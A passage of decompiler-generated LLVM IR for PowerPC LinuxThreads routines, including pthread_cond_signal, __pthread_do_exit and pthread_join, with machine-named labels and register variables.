  uselistorder i32 %v0_1001533c, { 8, 7, 9, 13, 12, 0, 1, 10, 11, 6, 14, 5, 4, 17, 16, 15, 18, 2, 19, 3 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @suspend.1, { 1, 0, 2 }
  uselistorder i32 268522496, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100154a0, { 1, 0 }
  uselistorder label %dec_label_pc_10015488, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015474, { 1, 0 }
  uselistorder label %dec_label_pc_10015438, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015410, { 1, 0 }
  uselistorder label %dec_label_pc_100153cc, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100154bc = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_100154bc, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 268522712, i32* @lr, align 4
  %v0_100154d4 = call i32 @__pthread_lock()
  %v0_100154d8 = load i32, i32* @r29, align 4
  %v1_100154dc = add i32 %arg1, 8
  store i32 %v1_100154dc, i32* @r3, align 4
  %v2_100154e0 = call i32 @remove_from_queue(i32 %v1_100154dc, i32 %v0_100154d8)
  %v0_100154e8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100154e8, i32* @r3, align 4
  store i32 268522736, i32* @lr, align 4
  %v0_100154ec = call i32 @__pthread_unlock()
  ret i32 %v2_100154e0

; uselistorder directives
  uselistorder i32 (i32, i32)* @remove_from_queue, { 1, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %v0_10015510 = call i32 @__asm_mfcr()
  store i32 %v0_10015510, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268522796, i32* @lr, align 4
  %v0_10015528 = call i32 @__pthread_lock()
  %v0_1001552c = load i32, i32* @r30, align 4
  %v1_1001552c = add i32 %v0_1001552c, 8
  %v2_1001552c = inttoptr i32 %v1_1001552c to i32*
  %v3_1001552c = load i32, i32* %v2_1001552c, align 4
  store i32 %v3_1001552c, i32* @r31, align 4
  store i32 %v0_1001552c, i32* @r3, align 4
  %v3_10015534 = icmp eq i32 %v3_1001552c, 0
  store i1 %v3_10015534, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10015534, label %dec_label_pc_1001554c, label %dec_label_pc_1001553c

dec_label_pc_1001553c:                            ; preds = %entry
  %v1_1001553c = add i32 %v3_1001552c, 8
  %v2_1001553c = inttoptr i32 %v1_1001553c to i32*
  %v3_1001553c = load i32, i32* %v2_1001553c, align 4
  store i32 %v3_1001553c, i32* %v2_1001552c, align 4
  %v1_10015548 = load i32, i32* @r31, align 4
  %v2_10015548 = add i32 %v1_10015548, 8
  %v3_10015548 = inttoptr i32 %v2_10015548 to i32*
  store i32 0, i32* %v3_10015548, align 4
  br label %dec_label_pc_1001554c

dec_label_pc_1001554c:                            ; preds = %entry, %dec_label_pc_1001553c
  store i32 268522832, i32* @lr, align 4
  %v0_1001554c = call i32 @__pthread_unlock()
  %v0_10015550 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10015550, label %dec_label_pc_10015568, label %dec_label_pc_10015554

dec_label_pc_10015554:                            ; preds = %dec_label_pc_1001554c
  %v2_10015558 = load i32, i32* @r31, align 4
  %v3_10015558 = add i32 %v2_10015558, 441
  %v4_10015558 = inttoptr i32 %v3_10015558 to i8*
  store i8 1, i8* %v4_10015558, align 1
  %v0_10015560 = load i32, i32* @r31, align 4
  store i32 %v0_10015560, i32* @r3, align 4
  store i32 268522856, i32* @lr, align 4
  %v1_10015564 = call i32 @restart(i32 %v0_10015560)
  br label %dec_label_pc_10015568

dec_label_pc_10015568:                            ; preds = %dec_label_pc_1001554c, %dec_label_pc_10015554
  %v1_1001557c = call %0 @__asm_mtcrf(i32 8, i32 %v0_10015510)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32)* @restart, { 3, 0, 2, 1 }
  uselistorder i32 441, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10015568, { 1, 0 }
  uselistorder label %dec_label_pc_1001554c, { 1, 0 }
}

define i32 @__linuxthreads_create_event(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10015588 = load i32, i32* @r3, align 4
  ret i32 %v0_10015588
}

define i32 @__linuxthreads_death_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1001558c = load i32, i32* @r3, align 4
  ret i32 %v0_1001558c
}

define i32 @__linuxthreads_reap_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_10015590 = load i32, i32* @r3, align 4
  ret i32 %v0_10015590
}

define i32 @__pthread_set_own_extricate_if.2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10015594 = call i32 @__asm_mfcr()
  store i32 %v0_10015594, i32* %r3.global-to-local, align 4
  %v3_10015598 = icmp eq i32 %arg2, 0
  store i1 %v3_10015598, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10015594, i32* @r31, align 4
  store i32 %v0_10015594, i32* @r4, align 4
  br i1 %v3_10015598, label %dec_label_pc_100155d8, label %dec_label_pc_100155c0

dec_label_pc_100155c0:                            ; preds = %entry
  %v1_100155c0 = add i32 %v0_10015594, 64
  %v2_100155c0 = inttoptr i32 %v1_100155c0 to i8*
  %v3_100155c0 = load i8, i8* %v2_100155c0, align 1
  %v3_100155c4 = icmp eq i8 %v3_100155c0, 0
  br i1 %v3_100155c4, label %dec_label_pc_100155d8.thread, label %dec_label_pc_100155e8

dec_label_pc_100155d8.thread:                     ; preds = %dec_label_pc_100155c0
  %v2_100155d84 = add i32 %v0_10015594, 444
  %v3_100155d85 = inttoptr i32 %v2_100155d84 to i32*
  store i32 %arg2, i32* %v3_100155d85, align 4
  br label %dec_label_pc_100155e8

dec_label_pc_100155d8:                            ; preds = %entry
  %v1_100155d0 = add i32 %v0_10015594, 28
  %v2_100155d0 = inttoptr i32 %v1_100155d0 to i32*
  %v3_100155d0 = load i32, i32* %v2_100155d0, align 4
  store i32 %v3_100155d0, i32* @r3, align 4
  store i32 268522968, i32* @lr, align 4
  %v0_100155d4 = call i32 @__pthread_lock()
  store i32 %v0_100155d4, i32* %r3.global-to-local, align 4
  %v0_100155d8.pre = load i32, i32* @r30, align 4
  %v1_100155d8.pre = load i32, i32* @r31, align 4
  %v0_100155dc.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_100155d8 = add i32 %v1_100155d8.pre, 444
  %v3_100155d8 = inttoptr i32 %v2_100155d8 to i32*
  store i32 %v0_100155d8.pre, i32* %v3_100155d8, align 4
  br i1 %v0_100155dc.pre, label %dec_label_pc_100155e0, label %dec_label_pc_100155e8

dec_label_pc_100155e0:                            ; preds = %dec_label_pc_100155d8
  %v0_100155e0 = load i32, i32* @r31, align 4
  %v1_100155e0 = add i32 %v0_100155e0, 28
  %v2_100155e0 = inttoptr i32 %v1_100155e0 to i32*
  %v3_100155e0 = load i32, i32* %v2_100155e0, align 4
  store i32 %v3_100155e0, i32* @r3, align 4
  store i32 268522984, i32* @lr, align 4
  %v0_100155e4 = call i32 @__pthread_unlock()
  store i32 %v0_100155e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100155e8

dec_label_pc_100155e8:                            ; preds = %dec_label_pc_100155d8.thread, %dec_label_pc_100155d8, %dec_label_pc_100155c0, %dec_label_pc_100155e0
  %v1_100155f8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10015594)
  %v0_10015600 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10015600

; uselistorder directives
  uselistorder i32 %v0_10015594, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_100155e8, { 3, 1, 0, 2 }
}

define i32 @suspend.3(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268523028, i32* @lr, align 4
  %v0_10015610 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10015610
}

define i32 @__pthread_do_exit() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_10015630 = load i32, i32* @r3, align 4
  store i32 %v0_10015630, i32* %r29.global-to-local, align 4
  %v2_1001563c = load i32, i32* @r2, align 4
  %v3_1001563c = add i32 %v2_1001563c, 64
  %v4_1001563c = inttoptr i32 %v3_1001563c to i8*
  store i8 1, i8* %v4_1001563c, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10015644 = load i32, i32* @r2, align 4
  %v3_10015644 = add i32 %v2_10015644, 65
  %v4_10015644 = inttoptr i32 %v3_10015644 to i8*
  store i8 0, i8* %v4_10015644, align 1
  %v0_10015648 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10015654.1047 to i32), i32* @lr, align 4
  %v1_10015650 = call i32 @__pthread_perform_cleanup(i32 %v0_10015648)
  store i32 268523096, i32* @lr, align 4
  %v1_10015654 = call i32 @__pthread_destroy_specifics(i32 %v1_10015650)
  %v0_10015658 = load i32, i32* @r31, align 4
  %v1_10015658 = add i32 %v0_10015658, 28
  %v2_10015658 = inttoptr i32 %v1_10015658 to i32*
  %v3_10015658 = load i32, i32* %v2_10015658, align 4
  store i32 %v3_10015658, i32* @r3, align 4
  store i32 %v0_10015658, i32* @r4, align 4
  store i32 268523108, i32* @lr, align 4
  %v0_10015660 = call i32 @__pthread_lock()
  store i32 %v0_10015660, i32* @r3, align 4
  %v0_10015664 = load i32, i32* @r31, align 4
  %v1_10015664 = add i32 %v0_10015664, 412
  %v2_10015664 = inttoptr i32 %v1_10015664 to i32*
  %v3_10015664 = load i32, i32* %v2_10015664, align 4
  store i32 %v3_10015664, i32* %r0.global-to-local, align 4
  %v0_10015668 = load i32, i32* @r29, align 4
  %v2_10015668 = add i32 %v0_10015664, 48
  %v3_10015668 = inttoptr i32 %v2_10015668 to i32*
  store i32 %v0_10015668, i32* %v3_10015668, align 4
  %v0_1001566c = load i32, i32* %r0.global-to-local, align 4
  %v3_1001566c = icmp eq i32 %v0_1001566c, 0
  br i1 %v3_1001566c, label %dec_label_pc_100156a4, label %dec_label_pc_10015674

dec_label_pc_10015674:                            ; preds = %entry
  %v3_10015678 = load i32, i32* @global_var_10045210.1011, align 4
  store i32 %v3_10015678, i32* %r0.global-to-local, align 4
  %v0_1001567c = load i32, i32* @r31, align 4
  %v1_1001567c = add i32 %v0_1001567c, 416
  %v2_1001567c = inttoptr i32 %v1_1001567c to i32*
  %v3_1001567c = load i32, i32* %v2_1001567c, align 4
  %v2_10015680 = or i32 %v3_1001567c, %v3_10015678
  store i32 %v2_10015680, i32* %r0.global-to-local, align 4
  %v1_10015684 = and i32 %v2_10015680, 256
  %v3_10015684 = icmp eq i32 %v1_10015684, 0
  br i1 %v3_10015684, label %dec_label_pc_100156a4, label %dec_label_pc_1001568c

dec_label_pc_1001568c:                            ; preds = %dec_label_pc_10015674
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10015690 = add i32 %v0_1001567c, 428
  %v3_10015690 = inttoptr i32 %v2_10015690 to i32*
  store i32 %v0_1001567c, i32* %v3_10015690, align 4
  %v0_10015694 = load i32, i32* %r0.global-to-local, align 4
  %v1_10015694 = load i32, i32* @r31, align 4
  %v2_10015694 = add i32 %v1_10015694, 424
  %v3_10015694 = inttoptr i32 %v2_10015694 to i32*
  store i32 %v0_10015694, i32* %v3_10015694, align 4
  %v0_1001569c = load i32, i32* @r31, align 4
  store i32 %v0_1001569c, i32* @global_var_10045218.1019, align 4
  %v2_100156a0 = call i32 @__linuxthreads_death_event(i32 %v0_10015660, i32 268697600)
  br label %dec_label_pc_100156a4

dec_label_pc_100156a4:                            ; preds = %dec_label_pc_10015674, %entry, %dec_label_pc_1001568c
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100156a8 = load i32, i32* @r31, align 4
  %v1_100156a8 = add i32 %v0_100156a8, 56
  %v2_100156a8 = inttoptr i32 %v1_100156a8 to i32*
  %v3_100156a8 = load i32, i32* %v2_100156a8, align 4
  store i32 %v3_100156a8, i32* %r29.global-to-local, align 4
  %v3_100156ac = add i32 %v0_100156a8, 44
  %v4_100156ac = inttoptr i32 %v3_100156ac to i8*
  store i8 1, i8* %v4_100156ac, align 1
  %v0_100156b0 = load i32, i32* @r31, align 4
  %v1_100156b0 = add i32 %v0_100156b0, 28
  %v2_100156b0 = inttoptr i32 %v1_100156b0 to i32*
  %v3_100156b0 = load i32, i32* %v2_100156b0, align 4
  store i32 %v3_100156b0, i32* @r3, align 4
  store i32 268523192, i32* @lr, align 4
  %v0_100156b4 = call i32 @__pthread_unlock()
  %v0_100156b8 = load i32, i32* %r29.global-to-local, align 4
  %v3_100156b8 = icmp eq i32 %v0_100156b8, 0
  br i1 %v3_100156b8, label %dec_label_pc_100156c8, label %dec_label_pc_100156c0

dec_label_pc_100156c0:                            ; preds = %dec_label_pc_100156a4
  store i32 %v0_100156b8, i32* @r3, align 4
  store i32 268523208, i32* @lr, align 4
  %v0_100156c4 = call i32 @__pthread_restart_new()
  br label %dec_label_pc_100156c8

dec_label_pc_100156c8:                            ; preds = %dec_label_pc_100156a4, %dec_label_pc_100156c0
  %v3_100156cc = load i32, i32* @global_var_100450e0, align 4
  store i32 %v3_100156cc, i32* %r29.global-to-local, align 4
  %v0_100156d0 = load i32, i32* @r31, align 4
  %v4_100156d0 = icmp eq i32 %v0_100156d0, %v3_100156cc
  br i1 %v4_100156d0, label %dec_label_pc_100156d8, label %dec_label_pc_10015730

dec_label_pc_100156d8:                            ; preds = %dec_label_pc_100156c8
  %v3_100156dc = load i32, i32* @global_var_100450e4.985, align 4
  store i32 %v3_100156dc, i32* %r0.global-to-local, align 4
  %v1_100156e0 = icmp slt i32 %v3_100156dc, 0
  br i1 %v1_100156e0, label %dec_label_pc_10015730, label %dec_label_pc_100156e8

dec_label_pc_100156e8:                            ; preds = %dec_label_pc_100156d8
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 %v3_100156cc, i32* %stack_var_-184, align 4
  %v2_100156f8 = ptrtoint i32* %stack_var_-184 to i32
  store i32 268523272, i32* @lr, align 4
  %v2_100157046 = call i32 @__libc_write(i32 %v3_100156dc, i32 %v2_100156f8)
  %v3_100157089 = icmp eq i32 %v2_100157046, -1
  br i1 %v3_100157089, label %dec_label_pc_10015710, label %dec_label_pc_10015720

dec_label_pc_10015710:                            ; preds = %dec_label_pc_100156e8, %dec_label_pc_10015710.dec_label_pc_100156f4_crit_edge
  %v0_10015710 = call i32 @__errno_location()
  %v1_10015714 = inttoptr i32 %v0_10015710 to i32*
  %v2_10015714 = load i32, i32* %v1_10015714, align 4
  store i32 %v2_10015714, i32* %r0.global-to-local, align 4
  %v3_10015718 = icmp eq i32 %v2_10015714, 4
  br i1 %v3_10015718, label %dec_label_pc_10015710.dec_label_pc_100156f4_crit_edge, label %dec_label_pc_10015720

dec_label_pc_10015710.dec_label_pc_100156f4_crit_edge: ; preds = %dec_label_pc_10015710
  %v3_100156fc.pre = load i32, i32* @global_var_100450e4.985, align 4
  store i32 268523272, i32* @lr, align 4
  %v2_10015704 = call i32 @__libc_write(i32 %v3_100156fc.pre, i32 %v2_100156f8)
  %v3_10015708 = icmp eq i32 %v2_10015704, -1
  br i1 %v3_10015708, label %dec_label_pc_10015710, label %dec_label_pc_10015720

dec_label_pc_10015720:                            ; preds = %dec_label_pc_10015710, %dec_label_pc_10015710.dec_label_pc_100156f4_crit_edge, %dec_label_pc_100156e8
  %v0_10015720 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10015720, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10015728.1049 to i32), i32* @lr, align 4
  %v1_10015724 = call i32 @suspend.3(i32 %v0_10015720)
  %v0_1001572c = call i32 @__GI_exit()
  br label %dec_label_pc_10015730

dec_label_pc_10015730:                            ; preds = %dec_label_pc_100156c8, %dec_label_pc_100156d8, %dec_label_pc_10015720
  %v1_10015734 = call i32 @__GI__exit(i32 0)
  ret i32 %v1_10015734

; uselistorder directives
  uselistorder i32 %v2_100156f8, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 6, 7, 4, 5, 8, 9, 10 }
  uselistorder i32 268523272, { 1, 0 }
  uselistorder label %dec_label_pc_10015730, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015720, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015710, { 1, 0 }
  uselistorder label %dec_label_pc_100156c8, { 1, 0 }
  uselistorder label %dec_label_pc_100156a4, { 2, 0, 1 }
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v0_10015744 = load i32, i32* @r2, align 4
  %v1_10015750 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_1001575c = add i32 %v1_10015750, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 %v2_1001575c, i32* @r3, align 4
  store i32 %v0_10015744, i32* @r4, align 4
  store i32 %v2_1001575c, i32* %stack_var_-180, align 4
  store i32 268523396, i32* @lr, align 4
  %v0_10015780 = call i32 @__pthread_lock()
  %v0_10015784 = load i32, i32* @r30, align 4
  %v1_10015784 = add i32 %v0_10015784, 8
  %v2_10015784 = inttoptr i32 %v1_10015784 to i32*
  %v3_10015784 = load i32, i32* %v2_10015784, align 4
  store i32 %v3_10015784, i32* @r31, align 4
  %v3_10015788 = icmp eq i32 %v3_10015784, 0
  br i1 %v3_10015788, label %dec_label_pc_1001579c, label %dec_label_pc_10015790

dec_label_pc_10015790:                            ; preds = %entry
  %v1_10015790 = add i32 %v3_10015784, 16
  %v2_10015790 = inttoptr i32 %v1_10015790 to i32*
  %v3_10015790 = load i32, i32* %v2_10015790, align 4
  %v0_10015794 = load i32, i32* %r28.global-to-local, align 4
  %v4_10015794 = icmp eq i32 %v0_10015794, %v3_10015790
  br i1 %v4_10015794, label %dec_label_pc_100157ac, label %dec_label_pc_1001579c

dec_label_pc_1001579c:                            ; preds = %dec_label_pc_10015790, %entry
  store i32 %v0_10015784, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100157a4.1051 to i32), i32* @lr, align 4
  %v0_100157a0 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015920

dec_label_pc_100157ac:                            ; preds = %dec_label_pc_10015790
  %v4_100157b0 = icmp eq i32 %v3_10015784, %v0_10015744
  br i1 %v4_100157b0, label %dec_label_pc_100157b8, label %dec_label_pc_100157c8

dec_label_pc_100157b8:                            ; preds = %dec_label_pc_100157ac
  store i32 %v0_10015784, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100157c0.1052 to i32), i32* @lr, align 4
  %v0_100157bc = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015920

dec_label_pc_100157c8:                            ; preds = %dec_label_pc_100157ac
  %v1_100157c8 = add i32 %v3_10015784, 45
  %v2_100157c8 = inttoptr i32 %v1_100157c8 to i8*
  %v3_100157c8 = load i8, i8* %v2_100157c8, align 1
  %v3_100157cc = icmp eq i8 %v3_100157c8, 0
  br i1 %v3_100157cc, label %dec_label_pc_100157d4, label %dec_label_pc_100157e0

dec_label_pc_100157d4:                            ; preds = %dec_label_pc_100157c8
  %v1_100157d4 = add i32 %v3_10015784, 56
  %v2_100157d4 = inttoptr i32 %v1_100157d4 to i32*
  %v3_100157d4 = load i32, i32* %v2_100157d4, align 4
  %v3_100157d8 = icmp eq i32 %v3_100157d4, 0
  br i1 %v3_100157d8, label %dec_label_pc_100157f0, label %dec_label_pc_100157e0

dec_label_pc_100157e0:                            ; preds = %dec_label_pc_100157c8, %dec_label_pc_100157d4
  store i32 %v0_10015784, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100157e8.1053 to i32), i32* @lr, align 4
  %v0_100157e4 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015920

dec_label_pc_100157f0:                            ; preds = %dec_label_pc_100157d4
  %v1_100157f0 = add i32 %v3_10015784, 44
  %v2_100157f0 = inttoptr i32 %v1_100157f0 to i8*
  %v3_100157f0 = load i8, i8* %v2_100157f0, align 1
  %v3_100157f4 = icmp eq i8 %v3_100157f0, 0
  br i1 %v3_100157f4, label %dec_label_pc_100157fc, label %dec_label_pc_100158b4

dec_label_pc_100157fc:                            ; preds = %dec_label_pc_100157f0
  %v2_10015800 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268523528, i32* @lr, align 4
  %v2_10015804 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_10015744, i32 %v2_10015800)
  %v1_1001580c = add i32 %v0_10015744, 66
  %v2_1001580c = inttoptr i32 %v1_1001580c to i8*
  %v3_1001580c = load i8, i8* %v2_1001580c, align 1
  %v3_10015810 = icmp eq i8 %v3_1001580c, 0
  br i1 %v3_10015810, label %dec_label_pc_1001582c, label %dec_label_pc_10015818

dec_label_pc_10015818:                            ; preds = %dec_label_pc_100157fc
  store i32 1, i32* %r29.global-to-local, align 4
  %v1_10015820 = add i32 %v0_10015744, 64
  %v2_10015820 = inttoptr i32 %v1_10015820 to i8*
  %v3_10015820 = load i8, i8* %v2_10015820, align 1
  %v3_10015824 = icmp eq i8 %v3_10015820, 0
  br i1 %v3_10015824, label %dec_label_pc_10015838, label %dec_label_pc_1001582c

dec_label_pc_1001582c:                            ; preds = %dec_label_pc_10015818, %dec_label_pc_100157fc
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10015834 = load i32, i32* @r31, align 4
  %v2_10015834 = add i32 %v1_10015834, 56
  %v3_10015834 = inttoptr i32 %v2_10015834 to i32*
  store i32 %v0_10015744, i32* %v3_10015834, align 4
  br label %dec_label_pc_10015838

dec_label_pc_10015838:                            ; preds = %dec_label_pc_10015818, %dec_label_pc_1001582c
  %v0_10015838 = load i32, i32* @r30, align 4
  store i32 %v0_10015838, i32* @r3, align 4
  store i32 268523584, i32* @lr, align 4
  %v0_1001583c = call i32 @__pthread_unlock()
  %v0_10015840 = load i32, i32* %r29.global-to-local, align 4
  %v3_10015840 = icmp eq i32 %v0_10015840, 0
  store i32 %v0_10015744, i32* @r3, align 4
  br i1 %v3_10015840, label %dec_label_pc_10015860, label %dec_label_pc_10015848

dec_label_pc_10015848:                            ; preds = %dec_label_pc_10015838
  store i32 268523604, i32* @lr, align 4
  %v2_10015850 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_10015744, i32 0)
  br label %dec_label_pc_100158a4

dec_label_pc_10015860:                            ; preds = %dec_label_pc_10015838
  store i32 268523624, i32* @lr, align 4
  %v1_10015864 = call i32 @suspend.3(i32 %v0_10015744)
  store i32 268523636, i32* @lr, align 4
  %v2_10015870 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_10015744, i32 0)
  %v1_10015878 = add i32 %v0_10015744, 440
  %v2_10015878 = inttoptr i32 %v1_10015878 to i8*
  %v3_10015878 = load i8, i8* %v2_10015878, align 1
  %v3_1001587c = icmp eq i8 %v3_10015878, 0
  br i1 %v3_1001587c, label %dec_label_pc_100158a8, label %dec_label_pc_10015884

dec_label_pc_10015884:                            ; preds = %dec_label_pc_10015860
  %v1_10015888 = add i32 %v0_10015744, 64
  %v2_10015888 = inttoptr i32 %v1_10015888 to i8*
  %v3_10015888 = load i8, i8* %v2_10015888, align 1
  %v3_1001588c = icmp eq i8 %v3_10015888, 0
  br i1 %v3_1001588c, label %dec_label_pc_10015894, label %dec_label_pc_100158a8

dec_label_pc_10015894:                            ; preds = %dec_label_pc_10015884
  store i8 0, i8* %v2_10015878, align 1
  br label %dec_label_pc_100158a4

dec_label_pc_100158a4:                            ; preds = %dec_label_pc_10015848, %dec_label_pc_10015894
  %v0_100158a4 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100158a8

dec_label_pc_100158a8:                            ; preds = %dec_label_pc_10015884, %dec_label_pc_10015860, %dec_label_pc_100158a4
  store i32 %v0_10015744, i32* @r4, align 4
  %v0_100158ac = load i32, i32* @r30, align 4
  store i32 %v0_100158ac, i32* @r3, align 4
  store i32 268523700, i32* @lr, align 4
  %v0_100158b0 = call i32 @__pthread_lock()
  br label %dec_label_pc_100158b4

dec_label_pc_100158b4:                            ; preds = %dec_label_pc_100157f0, %dec_label_pc_100158a8
  %v0_100158b4 = load i32, i32* %r27.global-to-local, align 4
  %v3_100158b4 = icmp eq i32 %v0_100158b4, 0
  br i1 %v3_100158b4, label %dec_label_pc_100158c4, label %dec_label_pc_100158bc

dec_label_pc_100158bc:                            ; preds = %dec_label_pc_100158b4
  %v0_100158bc = load i32, i32* @r31, align 4
  %v1_100158bc = add i32 %v0_100158bc, 48
  %v2_100158bc = inttoptr i32 %v1_100158bc to i32*
  %v3_100158bc = load i32, i32* %v2_100158bc, align 4
  %v2_100158c0 = inttoptr i32 %v0_100158b4 to i32*
  store i32 %v3_100158bc, i32* %v2_100158c0, align 4
  br label %dec_label_pc_100158c4

dec_label_pc_100158c4:                            ; preds = %dec_label_pc_100158b4, %dec_label_pc_100158bc
  %v0_100158c4 = load i32, i32* @r30, align 4
  store i32 %v0_100158c4, i32* @r3, align 4
  store i32 268523724, i32* @lr, align 4
  %v0_100158c8 = call i32 @__pthread_unlock()
  %v3_100158d0 = load i32, i32* @global_var_100450e4.985, align 4
  %v1_100158d4 = icmp slt i32 %v3_100158d0, 0
  br i1 %v1_100158d4, label %dec_label_pc_1001591c, label %dec_label_pc_100158dc

dec_label_pc_100158dc:                            ; preds = %dec_label_pc_100158c4
  store i32 %v0_10015744, i32* %stack_var_-172, align 4
  %v2_100158f4 = ptrtoint i32* %stack_var_-172 to i32
  store i32 268523780, i32* @lr, align 4
  %v2_1001590012 = call i32 @__libc_write(i32 %v3_100158d0, i32 %v2_100158f4)
  %v3_1001590415 = icmp eq i32 %v2_1001590012, -1
  br i1 %v3_1001590415, label %dec_label_pc_1001590c, label %dec_label_pc_1001591c

dec_label_pc_1001590c:                            ; preds = %dec_label_pc_100158dc, %dec_label_pc_1001590c.dec_label_pc_100158f0_crit_edge
  %v0_1001590c = call i32 @__errno_location()
  %v1_10015910 = inttoptr i32 %v0_1001590c to i32*
  %v2_10015910 = load i32, i32* %v1_10015910, align 4
  %v3_10015914 = icmp eq i32 %v2_10015910, 4
  br i1 %v3_10015914, label %dec_label_pc_1001590c.dec_label_pc_100158f0_crit_edge, label %dec_label_pc_1001591c

dec_label_pc_1001590c.dec_label_pc_100158f0_crit_edge: ; preds = %dec_label_pc_1001590c
  %v3_100158f8.pre = load i32, i32* @global_var_100450e4.985, align 4
  store i32 268523780, i32* @lr, align 4
  %v2_10015900 = call i32 @__libc_write(i32 %v3_100158f8.pre, i32 %v2_100158f4)
  %v3_10015904 = icmp eq i32 %v2_10015900, -1
  br i1 %v3_10015904, label %dec_label_pc_1001590c, label %dec_label_pc_1001591c

dec_label_pc_1001591c:                            ; preds = %dec_label_pc_100158dc, %dec_label_pc_1001590c, %dec_label_pc_1001590c.dec_label_pc_100158f0_crit_edge, %dec_label_pc_100158c4
  br label %dec_label_pc_10015920

dec_label_pc_10015920:                            ; preds = %dec_label_pc_100157e0, %dec_label_pc_100157b8, %dec_label_pc_1001579c, %dec_label_pc_1001591c
  %v0_10015930 = phi i32 [ 22, %dec_label_pc_100157e0 ], [ 35, %dec_label_pc_100157b8 ], [ 3, %dec_label_pc_1001579c ], [ 0, %dec_label_pc_1001591c ]
  ret i32 %v0_10015930

; uselistorder directives
  uselistorder i32 %v2_100158f4, { 1, 0 }
  uselistorder i32 %v0_10015784, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1001575c, { 1, 0 }
  uselistorder i32 %v0_10015744, { 3, 4, 2, 7, 8, 6, 9, 5, 10, 1, 11, 12, 13, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2 }
  uselistorder i32 268523780, { 1, 0 }
  uselistorder i32 (i32)* @suspend.3, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015920, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001591c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001590c, { 1, 0 }
  uselistorder label %dec_label_pc_100158c4, { 1, 0 }
  uselistorder label %dec_label_pc_100158b4, { 1, 0 }
  uselistorder label %dec_label_pc_100158a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100158a4, { 1, 0 }
  uselistorder label %dec_label_pc_10015838, { 1, 0 }
